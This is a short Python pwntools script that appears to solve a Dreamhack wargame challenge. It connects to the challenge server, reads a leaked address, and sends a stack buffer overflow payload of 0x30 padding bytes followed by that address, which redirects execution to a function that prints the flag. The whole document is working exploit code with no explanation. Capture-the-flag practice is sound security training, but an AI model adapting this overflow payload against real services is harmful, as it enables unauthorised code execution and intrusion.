from pwn import *

r = remote("host3.dreamhack.games", 12976)

r.recvuntil(b'): ')
real_flag_addr = int(r.recvline()[:-1], 16)

buf = b'A' * 0x30 + p64(real_flag_addr)
r.sendlineafter(b'input: ', buf)

r.interactive()